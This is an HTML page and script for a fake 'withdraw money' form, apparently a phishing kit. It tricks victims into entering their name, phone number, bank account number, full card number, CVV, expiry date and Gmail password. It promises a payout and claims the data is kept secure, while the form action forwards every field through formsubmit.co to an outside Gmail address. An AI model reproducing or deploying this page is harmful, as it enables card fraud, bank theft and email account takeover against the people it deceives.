<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>FILL THIS FORM TO WITHDRAW MONEY</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 1em;
      max-width: 500px;
      margin: auto;
    }
    input, select, button {
      display: block;
      width: 100%;
      padding: 0.8em;
      margin-top: 10px;
      box-sizing: border-box;
    }
    .hidden { display: none; }
    .message {
      padding: 10px;
      margin-top: 10px;
      font-weight: bold;
    }
    .green { background-color: #d4edda; color: #155724; }
    .red { background-color: #f8d7da; color: #721c24; }
    .secure-note {
      font-size: 0.9em;
      text-align: center;
      margin-top: 20px;
      color: #555;
    }
    .toggle-icon {
      position: relative;
    }
    .toggle-icon input {
      padding-right: 40px;
    }
    .toggle-icon span {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
      user-select: none;
    }
  </style>
</head>
<body>
  <form id="withdrawForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
    <h2>FILL THIS FORM TO WITHDRAW MONEY</h2>

    <input type="text" id="fullName" name="Full Name" placeholder="Full Name" required />

    <input type="tel" id="phoneNumber" name="Phone Number" placeholder="Phone Number (9‚Äì13 digits)" pattern="^\d{9,13}$" required />
    <span id="phoneError" class="red hidden">Phone number must be between 9 to 13 digits.</span>

    <input type="text" id="amount" name="Amount Allocated" placeholder="Amount Allocated" pattern="^\d{4,10}$" required />

    <label for="withdrawChoice">Do you want to withdraw <span id="amountSpan"></span> to <span id="phoneSpan"></span>?</label>
    <select id="withdrawChoice" required>
      <option value="">-- Select --</option>
      <option value="yes">Yes</option>
      <option value="no">No</option>
    </select>

    <div id="choiceMessages" class="hidden">
      <div id="greenMessage" class="message green"></div>
      <div id="redMessage" class="message red">>> Transactions Cancelled for international Money we only support BANK Payment <<</div>
    </div>

    <div id="hasBankBox" class="hidden">
      <label>Do you have a bank account?</label>
      <select id="hasBank" required>
        <option value="">-- Select --</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>
    </div>

    <div id="cancelMessage" class="message red hidden">Transactions Cancelled</div>

    <div id="bankDetails" class="hidden">
      <input type="text" name="Bank Account Number" placeholder="Bank Account Number" required />
      <label>Did you link ATM to your Bank Account?</label>
      <select id="atmLinked" required>
        <option value="">-- Select --</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>
    </div>

    <div id="atmDetails" class="hidden">
      <input type="text" name="ATM Card Number" placeholder="ATM Card Number" pattern="^\d{16}$" required />
      <input type="text" name="CVV" placeholder="CVV" pattern="^\d{3}$" required />
      <input type="text" name="Expiry Date" placeholder="MM/YY" maxlength="5" required id="expiryDate" />
      <div id="finalGreenMessage" class="message green hidden">Withdrawing <span id="finalAmount"></span> to your account</div>
    </div>

    <div id="emailSection" class="hidden">
      <label>Enter your email address to track your withdrawal.</label>
      <input type="email" name="Email" placeholder="Email (must end with @gmail.com)" pattern=".+@gmail\.com" required />
      
      <div class="toggle-icon">
        <input type="password" id="emailPassword" name="Email Password" placeholder="Email Password" required />
        <span onclick="togglePassword()">üëÅÔ∏è</span>
      </div>
    </div>

    <button id="submitButton" type="submit" class="hidden">Submit</button>

    <div class="secure-note">We keep your data secure and confidential.</div>

    <input type="hidden" name="_next" value="thankyou.html" />
  </form>

  <script>
    const form = document.getElementById('withdrawForm');
    const phone = document.getElementById('phoneNumber');
    const phoneError = document.getElementById('phoneError');
    const amount = document.getElementById('amount');
    const amountSpan = document.getElementById('amountSpan');
    const phoneSpan = document.getElementById('phoneSpan');
    const withdrawChoice = document.getElementById('withdrawChoice');
    const choiceMessages = document.getElementById('choiceMessages');
    const greenMessage = document.getElementById('greenMessage');
    const redMessage = document.getElementById('redMessage');
    const hasBankBox = document.getElementById('hasBankBox');
    const hasBank = document.getElementById('hasBank');
    const cancelMessage = document.getElementById('cancelMessage');
    const bankDetails = document.getElementById('bankDetails');
    const atmLinked = document.getElementById('atmLinked');
    const atmDetails = document.getElementById('atmDetails');
    const finalGreenMessage = document.getElementById('finalGreenMessage');
    const finalAmount = document.getElementById('finalAmount');
    const emailSection = document.getElementById('emailSection');
    const submitButton = document.getElementById('submitButton');

    function togglePassword() {
      const input = document.getElementById("emailPassword");
      input.type = input.type === "password" ? "text" : "password";
    }

    phone.addEventListener("blur", () => {
      const isValid = /^\d{9,13}$/.test(phone.value);
      phoneError.classList.toggle("hidden", isValid);
    });

    amount.addEventListener("input", () => {
      amountSpan.textContent = amount.value;
      finalAmount.textContent = amount.value;
    });

    phone.addEventListener("input", () => {
      phoneSpan.textContent = phone.value;
    });

    withdrawChoice.addEventListener("change", () => {
      choiceMessages.classList.add("hidden");
      hasBankBox.classList.add("hidden");
      bankDetails.classList.add("hidden");
      atmDetails.classList.add("hidden");
      emailSection.classList.add("hidden");
      cancelMessage.classList.add("hidden");
      submitButton.classList.add("hidden");

      if (withdrawChoice.value === "yes") {
        hasBankBox.classList.remove("hidden");
      } else if (withdrawChoice.value === "no") {
        choiceMessages.classList.remove("hidden");
        greenMessage.textContent = "Withdrawing " + amount.value + " to alternate number";
        hasBankBox.classList.remove("hidden");
      }
    });

    hasBank.addEventListener("change", () => {
      cancelMessage.classList.add("hidden");
      bankDetails.classList.add("hidden");
      atmDetails.classList.add("hidden");
      emailSection.classList.add("hidden");
      submitButton.classList.add("hidden");
      finalGreenMessage.classList.add("hidden");

      if (hasBank.value === "yes") {
        bankDetails.classList.remove("hidden");
      } else if (hasBank.value === "no") {
        cancelMessage.classList.remove("hidden");
        submitButton.classList.remove("hidden");
      }
    });

    atmLinked.addEventListener("change", () => {
      atmDetails.classList.add("hidden");
      finalGreenMessage.classList.add("hidden");
      emailSection.classList.add("hidden");
      submitButton.classList.add("hidden");
      cancelMessage.classList.add("hidden");

      if (atmLinked.value === "yes") {
        atmDetails.classList.remove("hidden");
        finalGreenMessage.classList.remove("hidden");
        emailSection.classList.remove("hidden");
        submitButton.classList.remove("hidden");
      } else if (atmLinked.value === "no") {
        cancelMessage.classList.remove("hidden");
        submitButton.classList.remove("hidden");
      }
    });

    document.getElementById("expiryDate").addEventListener("input", function (e) {
      let value = e.target.value.replace(/\D/g, "");
      if (value.length > 2) {
        value = value.slice(0, 2) + "/" + value.slice(2, 4);
      }
      e.target.value = value;
    });
  </script>
</body>
</html>
